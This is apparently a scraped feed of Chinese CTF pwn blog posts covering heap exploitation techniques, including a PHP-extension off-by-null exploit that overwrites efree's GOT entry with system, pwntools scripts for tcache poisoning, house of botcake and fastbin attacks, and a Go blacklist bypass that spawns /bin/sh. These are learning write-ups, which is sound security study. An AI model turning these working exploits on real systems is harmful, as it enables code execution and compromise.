0=&gt;&#34;0&#34;,1=&gt;&#34;1&#34;,2=&gt;&#34;2&#34;,3=&gt;&#34;3&#34;,4=&gt;&#34;4&#34;,5=&gt;&#34;5&#34;,6=&gt;&#34;6&#34;,7=&gt;&#34;7&#34;,8=&gt;&#34;8&#34;,9=&gt;&#34;9&#34;,10=&gt;&#34;a&#34;, 11=&gt;&#34;b&#34;,12=&gt;&#34;c&#34;,13=&gt;&#34;d&#34;,14=&gt;&#34;e&#34;,15=&gt;&#34;f&#34; ]; $result = &#34;&#34;; for($i = 0; $i &lt; 16; $i++){ $remainder = $value % 0x10; $value = (int)($value/0x10); $result = $hex64_table[$remainder] . $result; } return &#34;0x&#34; . $result; } function leakaddr($buffer){ global $libc,$mbase; $p = &#39;/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/&#39;; $p1 = &#39;/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/vuln.so/&#39;; // echo $buffer.&#39;&lt;br&gt;&#39;; preg_match_all($p, $buffer, $libc); preg_match_all($p1, $buffer, $mbase); return &#34;&#34;; } $libc=&#34;&#34;; $mbase=&#34;&#34;; ob_start(&#34;leakaddr&#34;); include(&#34;/proc/self/maps&#34;); $buffer = ob_get_contents(); ob_end_flush(); leakaddr($buffer); $libc_base = hexdec($libc[1][0]); $mod_base = hexdec($mbase[1][0]); echo hex64($libc_base).&#39;&lt;br&gt;&#39;; echo hex64($mod_base).&#39;&lt;br&gt;&#39;; $system_addr = 0x4c490; $efree_got = 0x4038; $a = str_repeat(&#34;a&#34;, 0x40); $b = str_repeat(&#34;b&#34;, 0x3f); for ($i = 1; $i &lt; 0xe; $i++) { $n = 0x61 + $i; $aa = pack(&#34;C&#34;, $n); $aaa = str_repeat($aa, 0x40); //0x40大小的堆块 //addHacker中arg1是被放在另一个堆块上的 addHacker($aaa, $b); } $cmd = &#34;/readflag &gt; /var/www/html/flag.txt\x00&#34;; editHacker(0,$cmd); removeHacker(7); $c = str_repeat(&#34;c&#34;, 0x40); //这里会利用off-by-null addHacker($a, $c); //把原来7的位置顶替，同时覆盖8原来的存的ck的最低字节为\x00 removeHacker(5); editHacker(8, int2str($mod_base+$efree_got)); #edit 8 相当于可以edit ck5 addHacker($a, $b); $payload = str_repeat(int2str($libc_base+$system_addr),8); addHacker($payload, $b); removeHacker(0); ?&gt; 心得体会 php中的string、go中的slice还有C++中的string都会在栈上开辟空间，这是很常见的。然后再把先前开的空间存的字符串复制到malloc开辟的空间上。 调试用到的指令 gdbserver 172.17.0.2:7777 /usr/local/bin/php /var/www/html/exp.php target remote 172.17.0.2:7777 b _start b *&amp;__libc_start_main+128 b *&amp;__libc_start_call_main+120 b *0x555555647a61 b zif_addHacker b zif_removeHacker b zif_editHacker b zif_displayHacker telescope 0x7ffff44750a0 arg2 telescope 0x7ffff448b000 arg1 telescope 0x7ffff44752d0 存ck7的chunk telescope 0x7ffff448b280 ck7 telescope 0x7ffff448b200 ck5的位置 0x7ffff4475280 存ck6的chunk 0x7ffff448b240 ck6 strings /lib/x86_64-linux-gnu/libc.so.6 | grep &#34;GLIBC&#34;   ]]></content></entry><entry><title>dbg小技巧</title><url>/post/pwn%E7%AC%94%E8%AE%B0/dbg%E5%B0%8F%E6%8A%80%E5%B7%A7/</url><categories><category>PWN</category><category>PWN笔记</category></categories><tags><tag>pwn</tag></tags><content type="html"><![CDATA[   fp tls disass search -p, &ndash;pointer Search for a pointer-width integer ROPgadget &ndash;binary libc-2.32.so | grep &lsquo;mov rdx, qword ptr [rdi + 8]&rsquo; ROPgadget &ndash;binary libc-2.32.so | grep &lsquo;rdx.*rdi&rsquo; 搜索包含同时出现rdx和rdi寄存器的指令 .*是一个正则表达式，表示匹配任意字符零次或多次 x /10i addr查看addr处机械码对应的汇编代码 c 10 相当于c 10次   ]]></content></entry><entry><title>decrypt safe unlink</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BBtcache/decrypt-safe-unlink/</url><categories><category>PWN</category><category>堆攻击tcache</category></categories><tags><tag>decrypt safe unlink</tag></tags><content type="html"><![CDATA[  [TOC] 这篇博客已经讲的很详细了 与libc2.31有些许不同的地方就是libc2.32多加了对next域的限制，稍作修改即可
代码 from pwn import * from pwnlib.util.packing import p64 from pwnlib.util.packing import u64 context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;) file = &#34;/home/zp9080/PWN/ezheap&#34; libc=ELF(&#34;/home/zp9080/PWN/libc-2.32.so&#34;) elf=ELF(file) p=process(file) # p=gdb.debug(file,&#39;b *$rebase(0x1707)&#39;) def add(size,content): p.sendlineafter(&#34;&gt;&gt; &#34;,str(1)) p.sendlineafter(&#34;Size: &#34;,str(size)) p.sendlineafter(&#34;Content: &#34;,content) def edit(index,content): p.sendlineafter(&#34;&gt;&gt; &#34;,str(2)) p.sendlineafter(&#34;Index: &#34;,str(index)) p.sendlineafter(&#34;Content: &#34;,content) def show(index): p.sendlineafter(&#34;&gt;&gt; &#34;,str(4)) p.sendlineafter(&#34;Index: &#34;,str(index)) def delete(index): p.sendlineafter(&#34;&gt;&gt; &#34;,str(3)) p.sendlineafter(&#34;Index: &#34;,str(index)) add(0x60,&#39;a&#39;*0x10)#0 add(0x60,&#39;b&#39;*0x10)#1 delete(0) show(0)#leak heapbase heap_base=u64(p.recv(5).ljust(8,b&#39;\x00&#39;))&lt;&lt;12 print(&#39;heapbase&#39;,hex(heap_base)) add(0x60,&#39;b&#39;)#2 delete(1) #tcache 0x70 : 0=2-&gt;1 delete(0) #add(0x80)是为了避免进入fastbin #3-10 for i in range(3,11): add(0x80,&#39;s&#39;) add(0x10,&#39;prevent chunk&#39;) for i in range(3,11): delete(i) #11 show(10)#leak libc libc_base=u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))-0x1e3c00 print(&#39;libcbase&#39;,hex(libc_base)) free_hook=libc_base+libc.symbols[&#39;__free_hook&#39;] sys_addr=libc_base+libc.symbols[&#39;system&#39;] value=((heap_base+0x2a0)&gt;&gt;12)^free_hook edit(2,p64(value)) add(0x60,&#39;/bin/sh\x00&#39;) add(0x60,p64(sys_addr)) delete(12) p.interactive() 原理 堆地址一般低12位为0，页对齐   ]]></content></entry><entry><title>docker</title><url>/post/tools/docker/</url><categories><category>Tools</category></categories><tags><tag>tools</tag></tags><content type="html"> docker的安装与使用 docker常用命令 docker在pwn中的使用 在docker中搭建pwn环境 vscode连接docker容器 docker最好还是用linux,毕竟出题给的dockerfile都还是linux的，因此这里用kali虚拟机来做pwn题 docker build -t my_php_image . docker run --privileged -d -p 8080:80 --name ciscn 0110200f272c 之后可以nc ip 8080 docker images,docker ps docker exec --privileged -it 0110200f272c /bin/bash 可以启动一个bash docker开启服务后，一般都是绑定到0.0.0.0，因此直接用虚拟机的ip就可以访问 如果有docker-compose.yml ，直接docker compose up -d sudo docker load --input ./filename docker load出错</content></entry><entry><title>dynamic sections</title><url>/post/stackoverflow/dynamic-sections/</url><categories><category>PWN</category><category>Stackoverflow</category></categories><tags><tag>stackoverflow</tag></tags><content type="html"> [TOC]
Global Offset Table GOT 表在 ELF 文件中分为两个部分：
.got，存储导入变量的地址。 .got.plt，存储导入函数的地址。 在 Linux 的实现中，.got.plt 的前三项的具体的含义如下： GOT[0]，.dynamic 的地址。 GOT[1]，指向 link_map 的指针，只会在动态装载器中使用，包含了进行符号解析需要的当前 ELF 对象的信息。每个 link_map 都是一条双向链表的一个节点，而这个链表保存了所有加载的 ELF 对象的信息。 GOT[2]，指向动态装载器中 _dl_runtime_resolve 函数的指针。 .got.plt 后面的项则是程序中不同 .so 中函数的引用地址。下面给出一个相应的关系 Procedure Linkage Table PLT 表将导入函数重定向到绝对地址。主要包括两部分 .plt，与常见导入的函数有关，如 read 等函数。 .plt.got，与动态链接有关系。 准确的说，plt 表不是查询表，而是一块代码。这一块内容是与代码相关的。 在动态链接下，程序模块之间包含了大量的函数引用。如果在程序开始执行前就把所有的函数地址都解析好，动态链接就会耗费不少时间用于解决模块之间的函数引用的符号查找以及重定位。但是，在一个程序运行过程中，可能很多函数在程序执行完时都不会用到，因此一开始就把所有函数都链接好可能会浪费大量资源，所以 ELF 采用了一种延迟绑定的做法，其基本思想是函数第一次被用到时才进行绑定（符号查找，重定位等），如果没有用则不进行绑定。所以程序开始执行前，模块间的函数调用都没有进行绑定，而是需要用到时才由动态链接器负责绑定。
在延迟绑定的情况下，总体流程如下图所示，蓝线表示首次执行的流程图，红线表示第二次以后调用的流程图 plt与got 为什么栈溢出时调用puts函数要使用plt表中的puts?能不能用GOT表puts呢？ 因为程序执行流调用函数时，跳转到的位置是plt表，plt表第一条指令是跳转到GOT表，但是，如果修改此jmp语句为类似system等函数的地址，程序不会遇到jmp语句，从而卡在这个“地址”处，无法接着执行。相反，修改GOT表的内容，在执行流到了plt时，会跳转到GOT表上的地址执行对应的函数，从而完成了hijack 不能调用GOT中的puts,理由和之前的类似，GOT表无论在修改前后，都只储存一个地址，无法实现函数的“调用” 。GOT表中，只有地址，而没有执行控制！</content></entry><entry><title>exit</title><url>/post/%E5%A0%86%E6%9D%82%E8%AE%B0/exit/</url><categories><category>PWN</category><category>堆杂记</category></categories><tags><tag>exit函数</tag></tags><content type="html"><![CDATA[  [TOC] exit_hook攻击 ​glibc-2.34​ 后失效
区分_exit()与exit() _exit()就是一个简单的系统调用syscall #include &amp;lt;unistd.h&amp;gt; void _exit(int status); exit() =&amp;gt; 进行用户层面的资源析构 + 调用_exit()进行系统级别的析构 libc将负责这个工作的函数定义为exit(), 其声明如下 #include &amp;lt;stdlib.h&amp;gt; extern void exit (int __status); exit()源码分析 在pwn中, _exit()是无法利用的(但是可以用assert), 但是exit()是有很多攻击点的, 因此本文会着重分析libc中exit()函数实现, 相关机制, 及其利用手法 exit()为libc中定义的函数, 是对__run_exit_handlers()的包装 void exit(int status) { //退出时调用__exit_funcs链表中的函数，__exit_funcs位于libc的.data段 __run_exit_handlers(status, &amp;amp;__exit_funcs, true); } 其中有一个重要的数据结构:__exit_funcs, 是一个指针, 指向 /保存析构函数的数组链表/, 其定义如下 static struct exit_function_list initial; //initial定义在libc的可写入段中 struct exit_function_list *__exit_funcs = &amp;amp;initial; //exit函数链表 exit_function_list结构体定义, 里面保存了多个析构的函数的描述 struct exit_function_list { struct exit_function_list *next; //单链表, 指向下一个exit_function_list结构体 size_t idx; //记录有多少个函数 struct exit_function fns[32]; //析构函数数组 }; struct exit_function是对单个析构函数的描述, 可以描述多种析构函数类型 // …  ]]></content></entry><entry><title>fastbin attack</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BB%E6%97%A7%E7%89%88/fastbin-attack/</url><categories><category>PWN</category><category>堆攻击旧版</category></categories><tags><tag>fastbin attack</tag></tags><content type="html"> [TOC] 核心： 1.存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞 2.漏洞发生于 fastbin 类型的 chunk 中 3.fastbin的单项链表结构,fd指针的运用
double free 核心是绕过double free
double_free的基本原理： fastbins 可以看成一个 LIFO 的栈，使用单链表实现，通过 fastbin-&amp;amp;gt;fd 来遍历 fastbins。由于 free 的过程会对 free list 做检查，我们不能连续两次 free 同一个 chunk，所以这里在两次 free 之间，增加了一次对其他 chunk 的 free 过程，从而绕过检查顺利执行。然后再 malloc 三次，就有了两个指向同一块内存区域的指针。 double_free的检查机制: old就是fastbin头部的chunk 从fastbin取出一个chunk要判断其大小是否对应idx 总结：通过 fastbin double free 我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。 如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果 (首先要通过验证)，这就相当于任意地址写任意值的效果。 house of spirit 核心是free的chunk是个fastbin chunk的样子，因此要进行伪造 可以参考这篇文章 house-of-spirit 是一种通过堆的 fast bin 机制来辅助栈溢出的方法，一般的栈溢出漏洞的利用都希望能够覆盖函数的返回地址以控制 EIP 来劫持控制流，但如果栈溢出的长度无法覆盖返回地址，同时却可以覆盖栈上的一个即将被 free 的堆指针，此时可以将这个指针改写为栈上的地址并在相应位置构造一个 fast bin 块的元数据，接着在 free 操作时，这个栈上的堆块被放到 fast bin 中，下一次 malloc 对应的大小时，由于 fast bin 的先进后出机制，这个栈上的堆块被返回给用户，再次写入时就可能造成返回地址的改写。 要绕过的检测： 1.fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。 2.fake chunk 地址需要对齐， …</content></entry><entry><title>fastbin reverse into tcache</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BBtcache/fastbin-reverse-into-tcache/</url><categories><category>PWN</category><category>堆攻击tcache</category></categories><tags><tag>fastbin reverse into tcache</tag></tags><content type="html"><![CDATA[  [TOC] 参考博客1 参考博客2 低版本 在2.27-2.31版本中，没有对fd指针加密，所以在利用的时候非常简单，只需要将tcache填满，然后放7个chunk进fastbin，并将第一个放进fastbin的chunk的fd改成目标地址，然后清空tcache，申请一个fastbin出来，就可以将target链入tcache并且是在头部，这样即可实现任意地址写一个堆地址的目的，还能将链入tcache的地址申请出来，达到任意地址写任意值。 高版本 从libc2.32开始，针对tcache和fastbin的fd指针都进行了一个加密，加密过程是用当前chunk的地址&amp;raquo;12去和fd值异或，并将结果作为新的fd值，所以在进行fastbin reverse into tcache的时候，就不能单纯的将fastbin的fd该成目标地址了，需要先和其地址&amp;raquo;12去异或 例题 TinyNote 这个题最多申请3个chunk，有uaf，也有show，但是只能malloc(0x10)，想要泄露libcbase肯定要搞出一个大于0x410的chunk才能泄露libcbase，这里是利用tcache poison伪造了一个fake chunk，绕过free的一些检查，即可泄露libcbase 这个题因为tcache poison很容易，也没有什么操作次数限制，因此可以很轻松地控制tcache perthread struct结构，那么就可以进行任意地址的获取与写入 这个exp只是为了学习fastbin reverse into tcache，实际上还可以优化，因为可以任意地址获取和任意地址写，因此很多高版本的io链都可以打，同时也可以打malloc_assert，这里就不再实现了 exp
from pwn import * from pwnlib.util.packing import u64 from pwnlib.util.packing import p64 context(os=&amp;#39;linux&amp;#39;, arch=&amp;#39;amd64&amp;#39;, log_level=&amp;#39;debug&amp;#39;) # p=gdb.debug(&amp;#34;/home/zp9080/PWN/viphouse&amp;#34;,&amp;#39;b *0x401AC3&amp;#39;) …  ]]></content></entry><entry><title>fastbin错位构造</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BB%E6%97%A7%E7%89%88/fastbin%E9%94%99%E4%BD%8D%E6%9E%84%E9%80%A0/</url><categories><category>PWN</category><category>堆攻击旧版</category></categories><tags><tag>fastbin错位构造</tag></tags><content type="html"><![CDATA[   通过错位构造\x7f可以得到malloc_hook edit(0x10,p64(libc.sym[&#39;__malloc_hook&#39;]-0x23)) add(0x68,b&#34;A&#34;*8) add(0x68,b&#34;\x00&#34;*0x13 + p64(one_gadget))   ]]></content></entry><entry><title>FastCP</title><url>/post/qemu-pwn/fastcp/</url><categories><category>PWN</category><category>Qemu Pwn</category></categories><tags><tag>qemu pwn</tag></tags><content type="html"> [TOC]
主要参考了这个博客 入门qemu逃逸第一题，花了好几天时间才把所有的细节搞明白 题目分析 题目名字就是fastcp，所以ida直接搜发现这些有关的 ，一般漏洞也都是因为mmio_write，所以开始代码审计，审计过程略 在mmio_write这个函数中跟进一个函数 这里的函数执行竟然是通过存储的timer结构体，因此如果可以控制timer结构体意味着就可以任意函数执行 然后就是看是MMIO还是PMIO 发现resource0，那就是MMIO了 exp分析 mmio_write与qemu的联系 看到qemu中的这个函数就在想这个mmio_mem怎么和这个qemu中的这个函数联系起来 应该这样理解，通过打开resource0这个设备再映射，那么往mmio_mem写入的东西会被这样处理:FastCPState *opaque和size这两个参数不用管，往mmio_mem写入东西的偏移就是addr,对应偏移的值就是val，这样一切都联系起来了 userbuf和phy_userbuf 这里要先理解我们写的exp和qemu是两个不同的进程，而我们的最终目的是通过泄露出qemu中的东西然后任意函数执行最终pwn掉qemu这个宿主 地址转换这个不多赘述 这里的userbuf就是exp这个进程的虚拟地址，phy_userbuf就是exp这个进程的物理地址，userbuf我们可以直接通过exp里面访问到（比如说memcpy这种函数都可以），但是phy_userbuf要通过mmio_mem才能访问到，但实际上这两个位置虽然不同，但是存的东西是一样的 qemu中的函数和exp中的函数分析 主要是fastcp_cp_timer这个函数,cp_info是这个函数的一个局部变量，cp_list_src要是phy_userbuf才行，因此我们不能在qemu这个进程中访问到exp进程的东西，但是却可以通过phy_userbuf访问到。同时我们可以在exp中把想要的数据复制给userbuf，这样就联系起来了 cmd=4，把cp_list_src也就是phy_userbuf中的cp_info复制给qemu中的cp_info这个局部变量，然后把cp_buffer中的数据复制给dst cmd=2，把src中的值复制给cp_buffer cmd=1，把src的值复制给buf，再把buf的值复制 …</content></entry><entry><title>fmtstr_payload</title><url>/post/format-string/fmtstr_payload/</url><categories><category>PWN</category><category>Format-String</category></categories><tags><tag>format-string</tag></tags><content type="html"><![CDATA[  [TOC]
适用情况 这个工具只适用于栈上的格式化字符串，可以参考offset变量的设置要求 这个工具写入的数据直接是一个size_t类型，所以如果限制输入长度，这个工具效果可能没有那么好 这个工具适用于栈上某个地方存的可能是0x7f开头的libc函数，但是我想写入一个elf文件里面的函数比如0x401488,这时候就很适用；或者栈上的数据是一个满的64位数字，想要写入一个0x7f开头的libc函数，这种情况比较适用 查看了官方文档发现它好像大部分都用的%n来写入，所以写入的是一个size_t类型 fmtstr_payload from pwn import * from pwnlib.util.packing import p64 from pwnlib.util.packing import u64 context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;) writes={ } payload=fmtstr_payload(offset=6,writes=writes,write_size=&#39;short&#39;) 参数设置 见官方文档   ]]></content></entry><entry><title>format_string-skills</title><url>/post/format-string/format_string-skills/</url><categories><category>PWN</category><category>Format-String</category></categories><tags><tag>format-string</tag></tags><content type="html"> [TOC]
一般rsp为相对格式化字符串的第5或6个参数 打ogg只用写入几个字节 返回地址本身就是Libc里面的函数 那么我们写入的时候为了省事其实可以只写入低3个字节就可以，因为one_gadget的来源是libcbase+one_gadget，因此写入低3个字节就可以
非栈上的格式化字符串 网站链接1 网站链接2 当然利用手法还很多样，比如写入一个orw链（禁用了execve）
函数调用过程 在栈上做了什么，参数入栈，后用到的先入栈（栈的先进后出原则）</content></entry><entry><title>gdbserver</title><url>/post/tools/gdbserver/</url><categories><category>Tools</category></categories><tags><tag>tools</tag></tags><content type="html"> GDB Server的远程调试功能 利用gdbserver apt-get install openssh-server apt-get install gdb apt-get install gdbserver apt install net-tools apt install iptables 在docker中gdbserver docker_ip:6666 file_addr args 然后在虚拟机中gdb,再target remote docker_ip:6666就行了，注意args要在gdbserver中设置，发现gdb远程连接后设置不了 docker中进行gdb调试 参考博客 这个操作虽然关闭了防火墙可以Ping通，但是与外界的网络通信都是被隔断的，慎用 iptables -L iptables -F 如果不小心用了，用如下操作进行恢复 iptables -F iptables -X iptables -t nat -F iptables -t nat -X iptables -t mangle -F iptables -t mangle -X iptables -P INPUT ACCEPT iptables -P FORWARD ACCEPT iptables -P OUTPUT ACCEPT systemctl restart networking systemctl restart NetworkManager</content></entry><entry><title>go语法特性</title><url>/post/go-pwn/go%E8%AF%AD%E6%B3%95%E7%89%B9%E6%80%A7/</url><categories><category>PWN</category><category>Go Pwn</category></categories><tags><tag>go pwn</tag></tags><content type="html"><![CDATA[   参考博客1 string,slice,多个返回值 内置数据类型 len与cap stringtoslicebyte memmove go的函数调用约定是这样的，传参用到的寄存器依次是：AX，BX，CX，DI，SI，R8，R9，R10，R11。但是要注意，如果是系统调用，还是rdi,rsi,rdx 有关 go逆向分析的一篇文章 很多时候调用一些函数，比如runtime_slicebytetostring，返回值rax应该就是一个指向字符串的指针，rbx就是这个指针的长度 题目描述 题目的重点就是要会用go语言写一个脚本执行system函数拿到shell，题目禁用了直接调用exec函数和orw，那么可以考虑用syscall执行exec 注意有一些字符串被禁止 blacklist = [&lsquo;sh&rsquo;,&lsquo;flag&rsquo;,&lsquo;fmt&rsquo;,&lsquo;io&rsquo;,&rsquo;log&rsquo;,&lsquo;server&rsquo;,&lsquo;cat&rsquo;,&lsquo;read&rsquo;,&lsquo;Read&rsquo;,&lsquo;os&rsquo;,&rsquo;exec&rsquo;,&lsquo;Print&rsquo;] package main import(&#34;syscall&#34;) func main(){ x:=&#34;/bin/s&#34;+&#34;h&#34; y:=[]string{&#34;/bin/s&#34; + &#34;h&#34;} syscall.Exec(x,y,nil) } exec函数的参数还是那样,参考others文件中的execve   ]]></content></entry><entry><title>hijackgot</title><url>/post/stackoverflow/hijackgot/</url><categories><category>PWN</category><category>Stackoverflow</category></categories><tags><tag>stackoverflow</tag></tags><content type="html"> 我们知道每次调用外部函数，我们必定会到GOT表中查询外部函数的真实地址，那么如果我们能将GOT中外部函数的地址修改为我们的目标函数，就可以实现任意函数执行的效果。
所以说，Hijack GOT需要以下两个基本条件：
需要可以实现任意地址写的函数（gets函数，read函数） 需要程序在完成GOT表修改后能够执行被我们修改的函数</content></entry><entry><title>house of apple1</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BBio_file/house-of-apple1/</url><categories><category>PWN</category><category>堆攻击IO_FILE</category></categories><tags><tag>house系列</tag></tags><content type="html"><![CDATA[  [TOC] 参考博客 house of apple1 需要和其他方法结合而进行后续的FSOP利用 _IO_wstrn_jumps
前言 利用条件 使用house of apple的条件为： 1、程序从main函数返回或能调用exit函数 2、能泄露出heap地址和libc地址 3、 能使用一次largebin attack（一次即可）
当程序从main函数返回或者执行exit函数的时候，均会调用fcloseall函数，该调用链为exit-&amp;gt;fcloseall-&amp;gt;_IO_cleanup-&amp;gt;_IO_flush_all_lockp-&amp;gt;_IO_OVERFLOW 最后会遍历_IO_list_all存放的每一个IO_FILE结构体，如果满足条件的话，会调用每个结构体中vtable-&amp;gt;_overflow函数指针指向的函数。 使用largebin attack可以劫持_IO_list_all变量，将其替换为伪造的IO_FILE结构体，而在此时，我们其实仍可以继续利用某些IO流函数去修改其他地方的值。要想修改其他地方的值，就离不开_IO_FILE的一个成员_wide_data的利用 核心 此时在堆上伪造一个_IO_FILE结构体并已知其地址为A，将A + 0xd8(vtable对应的偏移)替换为_IO_wstrn_jumps地址，A + 0xa0(_wide_data对应的偏移)设置为B，并设置其他成员以便能调用到_IO_OVERFLOW。exit函数则会一路调用到_IO_wstrn_overflow函数，并将B至B + 0x30的地址区域的内容都替换为A + 0xf0或者A + 0x1f0。
struct _IO_wide_data *_wide_data在_IO_FILE中的偏移为0xa0 伪造_IO_FILE结构体的时候，伪造_wide_data变量，然后通过某些函数，比如_IO_wstrn_overflow就可以将已知地址空间上的某些值修改为一个已知值。 static wint_t _IO_wstrn_overflow (FILE *fp, wint_t c) { _IO_wstrnfile *snf = (_IO_wstrnfile *) fp; if (fp-&amp;gt;_wide_data-&amp;gt;_IO_buf_base != …  ]]></content></entry><entry><title>house of apple2</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BBio_file/house-of-apple2/</url><categories><category>PWN</category><category>堆攻击IO_FILE</category></categories><tags><tag>house系列</tag></tags><content type="html"> [TOC] 参考博客 house of apple2心得体会 house of apple2可以在只劫持_wide_data的条件下控制程序的执行流!!!
fp的vtable覆盖为_IO_wxxx_jumps（加减偏移）,执行_IO_wfile_overflow或者_IO_wdefault_xsgetn，绕过里面一个个函数调用链，最后根据偏移执行_wide_vtable里面的函数，利用magic gadget执行orw拿到flag
利用条件 使用house of apple2的条件为：
已知heap地址和glibc地址 能控制程序执行IO操作，包括但不限于：从main函数返回、调用exit函数、通过__malloc_assert触发 能控制_IO_FILE的vtable和_wide_data，一般使用largebin attack去控制 漏洞分析 struct _IO_wide_data结构体，发现其对应有一个_wide_vtable成员
struct _IO_wide_data { wchar_t *_IO_read_ptr; /* Current read pointer */ wchar_t *_IO_read_end; /* End of get area. */ wchar_t *_IO_read_base; /* Start of putback+get area. */ wchar_t *_IO_write_base; /* Start of put area. */ wchar_t *_IO_write_ptr; /* Current put pointer. */ wchar_t *_IO_write_end; /* End of put area. */ wchar_t *_IO_buf_base; /* Start of reserve area. */ wchar_t *_IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ wchar_t *_IO_save_base; /* Pointer to start of non-current get area. */ wchar_t …</content></entry><entry><title>house of botcake</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BBtcache/house-of-botcake/</url><categories><category>PWN</category><category>堆攻击tcache</category></categories><tags><tag>house of botcake</tag></tags><content type="html"><![CDATA[  house of botcake 可以看看这篇文章 house of botcake一般都会配合tcache poison一起打 打tcache poison时如果限制了malloc的chunk的大小,可以多次分割unsorted bin进行覆写 一定要有uaf,只要chunklist不被清空就可以，有mark影响不大
add(14,0x70,&amp;#39;a&amp;#39;) payload=p64(0)+p64(0x91)+p64(__free_hook) add(11,0x20,payload) 代码 for i in range(7): add(i,0x80,&amp;#39;a&amp;#39;) #主要用7，8进行操作 add(7,0x80,&amp;#39;a&amp;#39;) add(8,0x80,&amp;#39;a&amp;#39;) add(9,0x20,&amp;#39;b&amp;#39;) for i in range(7): delete(i) delete(8) show(8) libc_base=u64(p.recvuntil(&amp;#39;\x7f&amp;#39;)[-6:].ljust(8,&amp;#39;\x00&amp;#39;))-0x1ecbe0 __free_hook=libc_base+libc.sym[&amp;#34;__free_hook&amp;#34;] system_addr=libc_base+libc.sym[&amp;#34;system&amp;#34;] leak(&amp;#34;libc_base &amp;#34;,libc_base) #此时会进行unlink 8，让7，8一起进入unsorted bin delete(7) #给8腾出一个位置，不然会触发double free or corruption (!prev) add(10,0x80,&amp;#39;a&amp;#39;) #8既在unsorted bin中，又在tcache中 delete(8) #打tcache poison payload=&amp;#39;a&amp;#39;*0x80+p64(0)+p64(0x91)+p64(__free_hook) add(11,0xa0,payload) add(12,0x80,&amp;#39;/bin/sh\x00&amp;#39;) add(13,0x80,p64(system_addr)) delete(12) 核心 构造出一个chunk既在unsorted …  ]]></content></entry><entry><title>house of cat</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BBio_file/house-of-cat/</url><categories><category>PWN</category><category>堆攻击IO_FILE</category></categories><tags><tag>house系列</tag></tags><content type="html"><![CDATA[  [TOC] 参考博客 参考博客 house of cat在_IO_switch_to_wget_mode可以设置rdx,随后调用setcontent+61可以直接进行orw，不用magic gadget 但是house of cat需要控制rcx不为0，在malloc_assert的时候可以满足，dbg时发现FSOP不能满足，此时建议打apple2
利用条件 1.能够任意写一个可控地址。 2.能够泄露堆地址和libc基址。 3.能够触发IO流（FSOP或触发__malloc_assert，或者程序中存在puts等能进入IO链的函数），执行IO相关函数
#漏洞分析
_IO_wfile_jumps const struct _IO_jump_t _IO_wfile_jumps libio_vtable = { JUMP_INIT_DUMMY, JUMP_INIT(finish, _IO_new_file_finish), JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow), JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow), JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow), JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail), JUMP_INIT(xsputn, _IO_wfile_xsputn), JUMP_INIT(xsgetn, _IO_file_xsgetn), JUMP_INIT(seekoff, _IO_wfile_seekoff), JUMP_INIT(seekpos, _IO_default_seekpos), JUMP_INIT(setbuf, _IO_new_file_setbuf), JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync), JUMP_INIT(doallocate, _IO_wfile_doallocate), JUMP_INIT(read, _IO_file_read), JUMP_INIT(write, _IO_new_file_write), JUMP_INIT(seek, _IO_file_seek), JUMP_INIT(close, _IO_file_close), JUMP_INIT(stat, _IO_file_stat), JUMP_INIT(showmanyc, _IO_default_showmanyc), JUMP_INIT(imbue, _IO_default_imbue) }; libc_hidden_data_def (_IO_wfile_jumps) _IO_wfile_seekoff off64_t _IO_wfile_seekoff (FILE *fp, off64_t offset, int dir, int mode) { off64_t result; off64_t delta, new_offset; long int count; //dbg的时候发现有时候mode会等于0，影响函数链的执行流程 if (mode == 0) return do_ftell_wide (fp); int must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base == fp-&gt;_wide_data-&gt;_IO_read_end) &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base == fp-&gt;_wide_data-&gt;_IO_write_ptr)); //需要绕过was_writing的检测 bool was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base) || _IO_in_put_mode (fp)); if (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp)) return WEOF; ...... } _IO_switch_to_wget_mode ► 0x7f4cae745d30 &lt;_IO_switch_to_wget_mode&gt; endbr64 让rax=_wide_data 0x7f4cae745d34 &lt;_IO_switch_to_wget_mode+4&gt; mov rax, qword ptr [rdi + 0xa0] 0x7f4cae745d3b &lt;_IO_switch_to_wget_mode+11&gt; push rbx 0x7f4cae745d3c &lt;_IO_switch_to_wget_mode+12&gt; mov rbx, rdi 这两步实际上在比较fp-&gt;_wide_data-&gt;_IO_write_ptr&gt; fp-&gt;_wide_data-&gt;_IO_write_base 0x7f4cae745d3f &lt;_IO_switch_to_wget_mode+15&gt; mov rdx, qword ptr [rax + 0x20] 0x7f4cae745d43 &lt;_IO_switch_to_wget_mode+19&gt; cmp rdx, qword ptr [rax + 0x18] 0x7f4cae745d47 &lt;_IO_switch_to_wget_mode+23&gt; jbe _IO_switch_to_wget_mode+56 让rax=_wide_data的vtable 0x7f4cae745d49 &lt;_IO_switch_to_wget_mode+25&gt; mov rax, qword ptr [rax + 0xe0] 0x7f4cae745d50 